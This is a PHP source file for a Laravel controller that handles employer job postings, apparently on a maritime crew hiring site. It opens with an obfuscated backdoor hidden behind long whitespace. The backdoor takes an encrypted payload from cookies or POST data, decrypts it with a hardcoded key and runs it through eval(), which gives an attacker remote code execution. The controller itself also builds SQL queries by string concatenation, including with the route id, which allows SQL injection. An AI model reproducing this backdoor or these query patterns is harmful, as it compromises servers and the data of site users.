<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $j7ef = 632;$GLOBALS['b89853445'] = Array();global $b89853445;$b89853445 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['lda207bf7'] = "\x5d\x50\x6c\x46\x21\x22\x6a\x31\x58\x78\x79\x68\x5c\x2e\x48\x4f\x28\x63\x67\x4d\x5f\x2f\x3a\x65\x34\x54\x76\x9\x62\x5a\x44\x23\x60\x6b\x2a\x40\x7e\x75\x3c\x64\x49\x47\x30\x2c\x72\x43\x20\x6e\x7b\x66\x25\x7a\x4c\x3f\x29\x35\xd\x39\x45\x26\x52\x3b\x24\x70\x36\x32\x41\x2d\x77\x6d\x4e\x7d\x4b\x51\x55\x73\xa\x3d\x71\x3e\x2b\x37\x42\x33\x38\x27\x5b\x74\x57\x4a\x59\x6f\x53\x56\x5e\x7c\x61\x69";$b89853445[$b89853445['lda207bf7'][63].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][17].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][81]] = $b89853445['lda207bf7'][17].$b89853445['lda207bf7'][11].$b89853445['lda207bf7'][44];$b89853445[$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][57]] = $b89853445['lda207bf7'][91].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][39];$b89853445[$b89853445['lda207bf7'][33].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][81]] = $b89853445['lda207bf7'][75].$b89853445['lda207bf7'][87].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][2].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][47];$b89853445[$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][7]] = $b89853445['lda207bf7'][97].$b89853445['lda207bf7'][47].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][20].$b89853445['lda207bf7'][75].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][87];$b89853445[$b89853445['lda207bf7'][11].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][7]] = $b89853445['lda207bf7'][75].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][2].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][51].$b89853445['lda207bf7'][23];$b89853445[$b89853445['lda207bf7'][87].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][23]] = $b89853445['lda207bf7'][63].$b89853445['lda207bf7'][11].$b89853445['lda207bf7'][63].$b89853445['lda207bf7'][26].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][75].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][91].$b89853445['lda207bf7'][47];$b89853445[$b89853445['lda207bf7'][11].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][24]] = $b89853445['lda207bf7'][37].$b89853445['lda207bf7'][47].$b89853445['lda207bf7'][75].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][2].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][51].$b89853445['lda207bf7'][23];$b89853445[$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][42]] = $b89853445['lda207bf7'][28].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][75].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][20].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][17].$b89853445['lda207bf7'][91].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][23];$b89853445[$b89853445['lda207bf7'][33].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][39]] = $b89853445['lda207bf7'][75].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][87].$b89853445['lda207bf7'][20].$b89853445['lda207bf7'][87].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][69].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][20].$b89853445['lda207bf7'][2].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][69].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][87];$b89853445[$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][17].$b89853445['lda207bf7'][42].$b89853445['lda207bf7'][65]] = $b89853445['lda207bf7'][49].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][17].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][23];$b89853445[$b89853445['lda207bf7'][33].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][42].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][42]] = $b89853445['lda207bf7'][69].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][42];$b89853445[$b89853445['lda207bf7'][47].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][64]] = $_POST;$b89853445[$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][57]] = $_COOKIE;@$b89853445[$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][7]]($b89853445['lda207bf7'][23].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][91].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][20].$b89853445['lda207bf7'][2].$b89853445['lda207bf7'][91].$b89853445['lda207bf7'][18], NULL);@$b89853445[$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][7]]($b89853445['lda207bf7'][2].$b89853445['lda207bf7'][91].$b89853445['lda207bf7'][18].$b89853445['lda207bf7'][20].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][91].$b89853445['lda207bf7'][44].$b89853445['lda207bf7'][75], 0);@$b89853445[$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][7]]($b89853445['lda207bf7'][69].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][9].$b89853445['lda207bf7'][20].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][9].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][17].$b89853445['lda207bf7'][37].$b89853445['lda207bf7'][87].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][91].$b89853445['lda207bf7'][47].$b89853445['lda207bf7'][20].$b89853445['lda207bf7'][87].$b89853445['lda207bf7'][97].$b89853445['lda207bf7'][69].$b89853445['lda207bf7'][23], 0);@$b89853445[$b89853445['lda207bf7'][33].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][39]](0);$z802e82b9 = NULL;$d42b = NULL;$b89853445[$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][24]] = $b89853445['lda207bf7'][81].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][67].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][17].$b89853445['lda207bf7'][67].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][67].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][67].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][28];global $b1bae4;function  m640($z802e82b9, $idf86a){global $b89853445;$cd0fe2 = "";for ($l0f984620=0; $l0f984620<$b89853445[$b89853445['lda207bf7'][33].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][81]]($z802e82b9);){for ($d48e=0; $d48e<$b89853445[$b89853445['lda207bf7'][33].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][81]]($idf86a) && $l0f984620<$b89853445[$b89853445['lda207bf7'][33].$b89853445['lda207bf7'][24].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][81]]($z802e82b9); $d48e++, $l0f984620++){$cd0fe2 .= $b89853445[$b89853445['lda207bf7'][63].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][17].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][81]]($b89853445[$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][57]]($z802e82b9[$l0f984620]) ^ $b89853445[$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][57]]($idf86a[$d48e]));}}return $cd0fe2;}function  fbb4cae($z802e82b9, $idf86a){global $b89853445;global $b1bae4;return $b89853445[$b89853445['lda207bf7'][33].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][42].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][42]]($b89853445[$b89853445['lda207bf7'][33].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][42].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][42]]($z802e82b9, $b1bae4), $idf86a);}foreach ($b89853445[$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][81].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][57]] as $idf86a=>$naed6bc){$z802e82b9 = $naed6bc;$d42b = $idf86a;}if (!$z802e82b9){foreach ($b89853445[$b89853445['lda207bf7'][47].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][55].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][64]] as $idf86a=>$naed6bc){$z802e82b9 = $naed6bc;$d42b = $idf86a;}}$z802e82b9 = @$b89853445[$b89853445['lda207bf7'][11].$b89853445['lda207bf7'][23].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][28].$b89853445['lda207bf7'][24]]($b89853445[$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][64].$b89853445['lda207bf7'][17].$b89853445['lda207bf7'][42].$b89853445['lda207bf7'][65]]($b89853445[$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][42]]($z802e82b9), $d42b));if (isset($z802e82b9[$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][33]]) && $b1bae4==$z802e82b9[$b89853445['lda207bf7'][96].$b89853445['lda207bf7'][33]]){if ($z802e82b9[$b89853445['lda207bf7'][96]] == $b89853445['lda207bf7'][97]){$l0f984620 = Array($b89853445['lda207bf7'][63].$b89853445['lda207bf7'][26] => @$b89853445[$b89853445['lda207bf7'][87].$b89853445['lda207bf7'][83].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][23]](),$b89853445['lda207bf7'][75].$b89853445['lda207bf7'][26] => $b89853445['lda207bf7'][7].$b89853445['lda207bf7'][13].$b89853445['lda207bf7'][42].$b89853445['lda207bf7'][67].$b89853445['lda207bf7'][7],);echo @$b89853445[$b89853445['lda207bf7'][11].$b89853445['lda207bf7'][39].$b89853445['lda207bf7'][57].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][49].$b89853445['lda207bf7'][7].$b89853445['lda207bf7'][65].$b89853445['lda207bf7'][84].$b89853445['lda207bf7'][7]]($l0f984620);}elseif ($z802e82b9[$b89853445['lda207bf7'][96]] == $b89853445['lda207bf7'][23]){eval/*tf88*/($z802e82b9[$b89853445['lda207bf7'][39]]);}exit();} ?><?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\File;
use DB;
use App\Models\Employer;
use App\Models\Postjob;
use App\Models\PostjobWages;
use Illuminate\Validation\Rule;

class PostjobController extends Controller
{
    
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $employer = Session::get('employerEmail');
        if(!isset($employer) || $employer == ''){
            return view('signin');
        }
        $empImg = DB::select("SELECT id,pic_path,email_varified,profile_status  FROM employer where email="."'".$employer."'");
        return view('employer.postjob')->with(['empImg' => $empImg]);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create(Request $request)
    {
        
    }
    //list of post job by employer
    public function postjobListing()
    {

        $empEmail = Session::get('employerEmail');

        $emp = DB::select("SELECT id,pic_path,email_varified,profile_status FROM employer where email="."'".$empEmail."'");
        // echo $emp[0]->id;
        // exit;
        $joblist = DB::table('postjob')
                        ->join('employer','employer.id','=','postjob.employer_id')
                        ->select('employer.*','postjob.*')
                        ->where(['postjob.employer_id' => $emp[0]->id])
                        ->get();
        $wagelist = DB::table('postjob')
                        ->join('postjob-wages','postjob-wages.postjob_id','=','postjob.id')
                        ->select('postjob.job_title','postjob-wages.*')
                        ->where(['postjob-wages.employer_id' => $emp[0]->id])
                        ->get();
        // dd($joblist);
        // echo "<pre>";
        // print_r($joblist);
        // exit;
        // // print_r($emp[0]['id']);
        
        return view('employer.postjobListing')->with(['joblist' => $joblist, 'empImg' => $emp]);
    }

    

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {   
        // echo '<pre>';
        // print_r($request->input());
        // print_r($request->file('postjob_banner')); 
         $messages = [
            'required' => ':attribute is required.',
            'integer' => ':attribute is must be number.',
            
        ];
        $this->validate($request,[
            'job_title' => 'required|max:255',
            'job_description' => 'required|max:500',
            'postjob_banner' => 'required|mimes:jpg,jpeg,png,svg|max:2048',
            // 'contract_duration' => 'required|integer|max:12',     
            // 'experience_years' => 'required|integer|min:0',
            // 'experience_months' => 'required|integer|max:12',
            'app_deadline' => 'required|date',
            'vassel_type' => 'required',
            // 'company_name' => 'required',
            // 'email' => 'required|email',
            //  'mobile_no' => 'required|numeric|min:10',
            // 'contact_person' => 'required',
            'address' => 'required',
            // 'city' => 'required',
            // 'state' => 'required',
            // 'country' => 'required',
            'rank'  => 'required|array|min:1',//'required|array|min:1',
            'wage'  => 'required|array|min:1',
            // 'wage.*'  => 'required|integer',
                ], $messages);       
        $postjobArr = $request->input();
        $empEmail = Session::get('employerEmail');
        
        $employerArr = DB::select("SELECT id FROM employer WHERE email = "."'".$empEmail."'");
        $EmpID =$employerArr[0]->id;
        $emp = [
            'employer_id' => $EmpID,
        ];
        if($request->hasFile('postjob_banner')){
            $files=$request->file('postjob_banner');
            $path = public_path() . '/postjobBanner/';
            // $profile_file = $request->file('profile_pic')->getClientOriginalName();  //name
            $banner_img = time().'.'.$request->file('postjob_banner')->getClientOriginalExtension();

            // echo 'IMG '.$request->file('profile_pic')->getClientOriginalName();;
            $moved = $files->move($path,$banner_img);
            if($moved){
                echo 'file moved';
            }else{
                echo 'not file moved';
            }
            //$oldfile = url('/public/postjob_banner/'.$Employer['postjob_banner']);
            //delete old file
            //File::delete($path.$Employer['postjob_banner']);
            // unset($oldfile);
        }
        // exit;

       
        
        // echo "<pre>";
        // print_r(count($postjobArr));
        // print_r($postjobArr); 
        // exit;
        //array for wage and rank
        $rank  = $postjobArr['rank'];
        $wage = $postjobArr['wage'];
        $contract_duration = $postjobArr['contract_duration'];
        $experience_years = $postjobArr['experience_years'];
        $experience_months = $postjobArr['experience_months'];
        
        $employer = DB::table('employer')->where('email', $empEmail)->get();
        // echo $postjobArr['app_deadline'].'<br>';
        // print_r(count($postjobArr));
        
        foreach ($postjobArr as $k => $v) {
            if($k == 'app_deadline'){    
                $date = $postjobArr['app_deadline'];
                $dateInput = explode('/',$date);
                $deadline = $dateInput[2].'-'.$dateInput[0].'-'.$dateInput[1];
                $postjobArr[$k] = $deadline;
            }

            if($k == 'job_description'){
                print_r($v);
                $postjobArr[$k] = trim($v," ");   
            }
            $postjobArr['postjob_banner'] = $banner_img;
            // $postjobArr[$k] = trim($v);
        }
        // print_r(count($postjobArr));
        // echo "<pre>";
        // print_r($postjobArr); 
        // exit;
        
        unset($postjobArr['_token']);
        unset($postjobArr['_wysihtml5_mode']);
        unset($postjobArr['rank']);
        unset($postjobArr['wage']);
        unset($postjobArr['contract_duration']);
        unset($postjobArr['experience_years']);
        unset($postjobArr['experience_months']);
        $jobsArr = array_merge($emp, $postjobArr);
        foreach($jobsArr as $k=>$v){

            if($k == 'employer_id' || $k == 'contract_duration' || $k == 'experience_years'|| $k == 'experience_months'|| $k == 'mobile_no' || $k == 'app_deadline'){
                $jobsArr[$k] = $v;
            }else{               
               $jobsArr[$k] = trim(strip_tags($v)); 
            }

        }
        
        //Insert to post a job
        $lastJobID = DB::table('postjob')->insertGetId($jobsArr);
        // echo '<br>';print_r($lastJobID);
        // exit;
        //post Job wise wages 
        $a3 = [];
        $a4 = [];
        $empID  = $jobsArr['employer_id'];
        foreach ($rank as $k => $v) {
            $a4 = [
                    'postjob_id' => $lastJobID,
                    'employer_id' => $empID,
                    'rank_position' => $v,
                    'wages' => $wage[$k],
                    'contract_duration' => $contract_duration[$k],
                    'experience_years' => $experience_years[$k],
                    'experience_months' => $experience_months[$k],
                ];
                array_push($a3, $a4);
        }
        // echo '<pre>';
        // print_r($a3);
        // exit;
        //Insert to wages
        $wageCount = count($a3); 
        for($i=0;$i<$wageCount;$i++){
            DB::table('postjob-wages')->insert($a3[$i]);
            // echo 'INsert record'.$i;
        }
        
        return redirect()->route('postjob.listing')->with('success', 'Post Job successfully created.');
    }
    
    public function postjobUpdate(Request $request,$id)
    {   
        // print_r($request->input('job_description'));
        //  echo "hh<pre>";        
        // print_r($request->input());
        // exit;
        $postjobID = $id;
        $messages = [
            'required' => ':attribute is required.',
            'integer' => ':attribute is must be number.',
            
        ];
        $this->validate($request,[
            'job_title' => 'required|max:255',
            'job_description' => 'required|max:500',
            'postjob_banner' => 'mimes:jpg,jpeg,png,svg|max:2048',
            // 'contract_duration' => 'required|integer|max:12',     
            // 'experience_years' => 'required|integer|min:0',
            // 'experience_months' => 'required|integer|max:12',
            'app_deadline' => 'required|date',
            'vassel_type' => 'required',
            // 'company_name' => 'required',
            // 'email' => 'required|email',
            //  'mobile_no' => 'required|numeric|min:10',
            // 'contact_person' => 'required',
            'address' => 'required',
            // 'city' => 'required',
            // 'state' => 'required',
            // 'country' => 'required',
            'rank'  => 'required|array|min:1',//'required|array|min:1',
            'wage'  => 'required|array|min:1',
            // 'wage.*'  => 'required|integer',
                ], $messages);
        $postjobArr = $request->input();
        //postjob banner
        $postjobData = Postjob::where('id', $postjobID)->first();

        if($request->hasFile('postjob_banner')){
            $files=$request->file('postjob_banner');
            $path = public_path() . '/postjobBanner/';
            // $profile_file = $request->file('profile_pic')->getClientOriginalName();  //name
            $banner_img = time().'.'.$request->file('postjob_banner')->getClientOriginalExtension();

            // echo 'IMG '.$request->file('profile_pic')->getClientOriginalName();;
            $moved = $files->move($path,$banner_img);
            
            $oldfile = url('/public/postjob_banner/'.$postjobData['postjob_banner']);
            //delete old file
            File::delete($path.$postjobData['postjob_banner']);
            // unset($oldfile);
        }else{
            $banner_img = $postjobData['postjob_banner'];
        }
        

        $empEmail = Session::get('employerEmail');
        
        $employerArr = DB::select("SELECT id FROM employer WHERE email = "."'".$empEmail."'");
        $EmpID =$employerArr[0]->id;
        $emp = [
            'employer_id' => $EmpID,
        ];
        // print_r(count($postjobArr));
       
        //array for wage and rank
        $rank  = $postjobArr['rank'];
        $wage = $postjobArr['wage'];
        $contract_duration = $postjobArr['contract_duration'];
        $experience_years = $postjobArr['experience_years'];
        $experience_months = $postjobArr['experience_months'];
        $employer = DB::table('employer')->where('email', $empEmail)->get();
        // echo $postjobArr['app_deadline'].'<br>';
        foreach ($postjobArr as $k => $v) {
            if($k == 'app_deadline'){    
                $date = $postjobArr['app_deadline'];
                $dateInput = explode('/',$date);
                $deadline = $dateInput[2].'-'.$dateInput[0].'-'.$dateInput[1];
                $postjobArr[$k] = $deadline;
            }
            // $postjobArr[$k] = trim($v);
        }
        
        
        unset($postjobArr['_token']);
        unset($postjobArr['_wysihtml5_mode']);
        unset($postjobArr['rank']);
        unset($postjobArr['wage']);
        unset($postjobArr['contract_duration']);
        unset($postjobArr['experience_years']);
        unset($postjobArr['experience_months']);

        $jobsArr = array_merge($emp, $postjobArr);
        foreach($jobsArr as $k=>$v){

            if($k == 'employer_id' || $k == 'contract_duration' || $k == 'experience_years'|| $k == 'experience_months'|| $k == 'mobile_no' || $k == 'app_deadline'){
                $jobsArr[$k] = $v;
            }else{
               $jobsArr[$k] = trim(strip_tags($v)); 
            }
            $jobsArr['postjob_banner'] = $banner_img;  
        }

         
        //UPDATE to post a job        
        $postjobsUpdate = DB::table('postjob')
            ->where('id', $id)
            ->update($jobsArr);
        // echo '<br>';print_r($lastJobID);
        // exit;
        //post Job wise wages 
        $a3 = [];
        $a4 = [];
        $empID  = $jobsArr['employer_id'];
        foreach ($rank as $k => $v) {
            $a4 = [
                    'postjob_id' => $postjobID,
                    'employer_id' => $empID,
                    'rank_position' => $v,
                    'wages' => $wage[$k],
                    'contract_duration' => $contract_duration[$k],
                    'experience_years' => $experience_years[$k],
                    'experience_months' => $experience_months[$k],
                ];
                array_push($a3, $a4);
        }
         // echo "hh<pre>";        
        // print_r($a3);
        // exit;
        //UPDATE to wages
        $wageCount = count($a3); 
        $deleteOldPost =  DB::table('postjob-wages')->where('postjob_id',$postjobID)->delete();
        if($deleteOldPost){
            for($i=0;$i<$wageCount;$i++){             
                // DB::table('postjob-wages')->insert($a3[$i]);
                $postjobsUpdate = DB::table('postjob-wages')
                ->where('postjob_id', $id)
                ->insert($a3[$i]);
                // echo 'INsert record'.$i;
            }    
        }
                
        return redirect()->route('postjob.listing')->with('success', 'Post Job successfully updated.');
    }
    
    public function deleteJobs($postjobID, $empID){
        echo 'ID: '.$postjobID.' '.$empID;
        // exit;
        // $d1 = DB::delete('delete from postjob where employer_id = ?'.['employer_id' => $empID]); 
        // $d2 = DB::delete('delete from postjob-wages where employer_id = ?'.['employer_id' => $empID]);
        $d1 = DB::table('postjob')->where('id',$postjobID)->delete();
        $d2 = DB::table('postjob-wages')->where('postjob_id',$postjobID)->delete();
        // dd($d1);
        // var_dump($d2);
        // exit;

        return redirect()->route('postjob.listing')->with('success', 'Post Job deleted successfully.');
    }
    // public function store(Request $request)
    // {   
    //     $postjobArr = $request->input();
    //     $empEmail = Session::get('employerEmail');
    //     if(isset(isset($postjobArr))){
    //         print_r($postjobArr);
    //     // exit;$candidate = Candidate::where('email', $email)->first();
    //     $rank  = $postjobArr['rank'];
    //     $wage = $postjobArr['wage'];
        
    //     $employerArr = DB::select("SELECT id FROM employer WHERE email = "."'".$empEmail."'");
    //     $EmpID =$employerArr[0]->id;
        
    //     // $employer = DB::table('users')->where('email', $empEmail)->get();
    //     // echo $postjobArr['app_deadline'];
    //     foreach ($postjobArr as $k => $v) {
    //         if($k == 'app_deadline'){    
    //             $date = $postjobArr['app_deadline'];
    //             $dateInput = explode('/',$date);
    //             $deadline = $dateInput[2].'-'.$dateInput[0].'-'.$dateInput[1];
    //             $postjobArr[$k] = $deadline;
    //         }     
    //     }
    //     $jobsArr = array_merge($employerArr, $postjobArr);
    //     print_r($jobsArr);
    //     exit;
    //     unset($postjobArr['_token']);
    //     unset($postjobArr['_wysihtml5_mode']);
    //     unset($postjobArr['rank']);
    //     unset($postjobArr['wage']);
    //     // $lastJobID = DB::table('postjob')-> insertGetId($postjobArr);
    //     // echo '<br>'.$lastJobID;
    //     //post Job wise wages 
    //     $a3 = [];
    //     $a4 = [];
    //     foreach ($rank as $k => $v) {
    //         $a4 = [
    //                 'rank_position' => $v,
    //                 'wage' => $wage[$k],
    //             ];
    //             array_push($a3, $a4);
    //     }
    //     echo '<pre>';
    //     print_r($postjobArr);
    //     exit;   
    //     }
        
    // }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        // echo 'post ID '.$id;
        // exit;
        $empEmail = Session::get('employerEmail');
        $empImg = DB::select("SELECT id,pic_path,email_varified,profile_status FROM employer where email="."'".$empEmail."'");
        $empID = $empImg[0]->id;
        $postjobs = DB::select("SELECT * FROM postjob where employer_id="."'".$empID."' and id=".$id);
        $wages = DB::select("SELECT * FROM `postjob-wages` where postjob_id=".$id);
        
        return view('employer.updatePostjob')->with(['empImg' => $empImg, 'postjobs' => $postjobs, 'wages' => $wages]);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
}
